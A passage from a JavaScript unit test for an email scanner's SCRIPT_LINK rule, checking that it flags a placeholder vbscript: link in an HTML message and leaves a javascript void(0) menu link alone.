		assert.ok(names(await scanner.scan(html, passed('notice-center.example'))).includes('SCRIPT_LINK'));
		const empty = await scanner.scan(`${head('it@notice-center.example')}Content-Type: text/html\r\n\r\n<a href="vbscript:x"></a>`);
		assert.match(empty.tests.find(test => test.name === 'SCRIPT_LINK').description, /^A link runs/);
		assert.ok(!names(await scanner.scan(message({html: `<a href="${js}:void(0)">Menu</a>`}))).includes('SCRIPT_LINK'));
	});
});
